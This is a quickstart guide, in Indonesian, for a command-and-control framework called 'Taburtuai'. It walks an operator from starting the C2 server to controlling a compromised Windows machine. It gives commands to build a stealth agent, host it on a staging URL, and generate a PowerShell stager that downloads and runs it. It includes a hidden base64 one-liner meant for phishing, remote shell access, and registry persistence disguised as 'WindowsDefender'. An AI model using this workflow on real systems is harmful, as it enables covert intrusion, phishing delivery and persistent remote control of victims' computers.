# 03 — Quickstart

> Dari nol ke agent aktif di target. Ikuti langkah ini secara berurutan.

---

## Gambaran Besar

```
[Operator Machine]          [C2 Server (VPS)]          [Target Machine]
       │                           │                           │
  1. Build agent ──────────────────►                           │
  2. Upload agent ─────────────────►                           │
  3. Generate stager ──────────────►                           │
  4. Kirim stager ke target ────────────────────────────────► │
                                   │◄── 5. Agent beacon ───── │
  6. Buka console ─────────────────►                           │
  7. Kirim perintah ───────────────►──── perintah ──────────► │
                                   │◄── hasil ─────────────── │
  8. Lihat hasil ◄─────────────────│                           │
```

---

## Langkah 1 — Jalankan C2 Server

```bash
# Di mesin VPS/server
ENCRYPTION_KEY=MySecretKey2026 ./bin/server --port 8000

# Output yang muncul:
# [+] Taburtuai C2 Server starting...
# [+] Database: data/taburtuai.db
# [+] Listening on :8000
```

Biarkan terminal ini terbuka (atau gunakan screen/tmux).

---

## Langkah 2 — Build Agent

```bash
# Di mesin operator (boleh Linux/macOS/Windows)
make agent-win-stealth \
  C2_SERVER=http://172.23.0.118:8000 \
  ENC_KEY=MySecretKey2026 \
  INTERVAL=30 \
  JITTER=20

# Output:
# [*] Building Windows stealth agent...
# [+] Windows stealth: bin/agent_windows_stealth.exe
```

> Ganti `172.23.0.118` dengan IP server kamu yang bisa diakses dari internet.

---

## Langkah 3 — Upload Agent ke Stage Server

```bash
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server http://172.23.0.118:8000 \
  --format exe \
  --arch amd64 \
  --ttl 24 \
  --desc "quickstart-test"

# Output:
# [+] Stage uploaded (9842512 bytes)
#     Token    : 6a69a21a750af40e983cf257b3d2e4a9
#     Stage URL: http://172.23.0.118:8000/stage/6a69a21a750af40e983cf257b3d2e4a9
#     Expires  : 2026-04-24T16:00:00Z
```

**Simpan token ini.** Dibutuhkan di langkah berikutnya.

---

## Langkah 4 — Generate Stager

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MySecretKey2026 \
  --format ps1 \
  --exec-method drop \
  --output stager.ps1

# Output:
# [*] Compiling stager (amd64/windows)...
# [+] Stager compiled: 1847 KB
# [+] Output: stager.ps1 (2501 bytes)
```

---

## Langkah 5 — Jalankan Stager di Target

Kirim `stager.ps1` ke target. Cara paling mudah untuk lab/testing:

```powershell
# Di mesin Windows target — jalankan di PowerShell
powershell -ExecutionPolicy Bypass -File .\stager.ps1
```

Atau encode ke one-liner (untuk paste di Run dialog/phishing):

```powershell
# Di mesin operator — encode ke base64
$bytes = [System.IO.File]::ReadAllBytes("stager.ps1")
$b64   = [System.Convert]::ToBase64String($bytes)
Write-Host "powershell -w hidden -ep bypass -enc $b64"
```

Target menjalankan perintah tersebut → stager download agent dari C2 → agent jalan di background.

---

## Langkah 6 — Buka Operator Console

```bash
./bin/operator console --server http://172.23.0.118:8000
```

```
  [*] Connected to http://172.23.0.118:8000
  [*] Type help for commands, exit to quit.

taburtuai(172.23.0.118:8000) ›
```

---

## Langkah 7 — Lihat Agent yang Masuk

```
taburtuai(172.23.0.118:8000) › agents list
[*] Fetching agent list...
[+] Found 1 agent(s)

AGENT ID                             HOSTNAME         USERNAME  STATUS  LAST SEEN
-------------------------------------------------------------------------------------
2703886d-32fb-4a1c-8f2d-9b3e4c5d6e7f DESKTOP-QLPBF95  windows   online  just now
```

---

## Langkah 8 — Eksekusi Perintah Pertama

```
taburtuai(172.23.0.118:8000) › cmd 2703886d "whoami"
[*] Queuing command...
[+] Command queued: a1b2c3d4-...
[*] Waiting for result...
[+] Result received (1.2s):

DESKTOP-QLPBF95\windows
```

```
taburtuai(172.23.0.118:8000) › cmd 2703886d "ipconfig /all"
```

---

## Langkah 9 — Interactive Shell

```
taburtuai(172.23.0.118:8000) › shell 2703886d

[shell 2703886d DESKTOP-QLPBF95\windows] > whoami
DESKTOP-QLPBF95\windows

[shell 2703886d DESKTOP-QLPBF95\windows] > systeminfo | findstr /i "os"
OS Name:    Microsoft Windows 11 Home
OS Version: 10.0.22621

[shell 2703886d DESKTOP-QLPBF95\windows] > exit
[*] Shell session ended.
```

---

## Langkah 10 — Setup Persistence (Opsional)

Agar agent tetap jalan setelah reboot:

```
taburtuai(172.23.0.118:8000) › persistence setup 2703886d \
  --method registry_run \
  --name "WindowsDefender" \
  --wait

[*] Setting up registry_run persistence 'WindowsDefender' on agent 2703886d...
[+] Persistence 'WindowsDefender' using method 'registry_run' setup successfully.
[*] Agent should now survive reboots and maintain access.
```

---

## Checklist Selesai

```
[✓] Server C2 jalan dan bisa diakses dari internet
[✓] Agent dikompilasi dengan server URL dan key yang benar
[✓] Stage diupload dan token disimpan
[✓] Stager di-generate dan dikirim ke target
[✓] Agent muncul di agents list dengan status online
[✓] Perintah pertama berhasil dieksekusi
[✓] Persistence terpasang
```

---

## Troubleshooting Cepat

| Masalah | Penyebab | Solusi |
|---|---|---|
| Agent tidak muncul di list | Server tidak bisa diakses dari target | Cek firewall, verifikasi IP |
| Agent `offline` terus | Key mismatch | Pastikan `ENC_KEY` = `ENCRYPTION_KEY` di server |
| Stage 404 | Token belum diupload | Jalankan `stage upload` dulu |
| Stage 410 | TTL habis | Upload ulang, generate stager baru |
| Command pending terus | Agent sudah mati / key salah | Cek agent list status |

---

**Selanjutnya:** [04 — Agent Management](04-agents.md)
